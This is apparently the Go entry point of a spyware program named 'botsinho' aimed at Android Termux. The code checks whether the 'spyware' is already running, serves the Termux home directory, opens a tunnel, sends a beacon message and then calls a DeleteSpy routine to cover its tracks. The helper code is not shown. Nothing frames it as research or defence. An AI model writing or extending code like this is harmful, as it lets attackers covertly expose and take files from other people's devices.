package main

import (
	"botsinho/utils"
	"botsinho/utils/config"
	"embed"
	"fmt"
	"time"
	//"fmt"
)



func main(){
	
	fmt.Println("INICIANDO")
	
	run, data := config.IsRunSpyware()
	if(!run){
		fmt.Println("El script ya esta corriendo v")
		fmt.Println(data)
	
		
	}else{
		if (config.ConfigTrmx()){
			fmt.Println(data)
			
		
			Init()
			
		}
	}
	
	
	
}

var content embed.FS
func Init(){
	//termux > /data/data/com.termux/files/home
	go utils.ServerInit("/data/data/com.termux/files/home")
	go utils.InitTunnel()
	
	time.Sleep(10*time.Second)
	utils.Send("As")
	//fmt.Println("siuuuuu")
	config.DeleteSpy()
	select{}
	

	
}



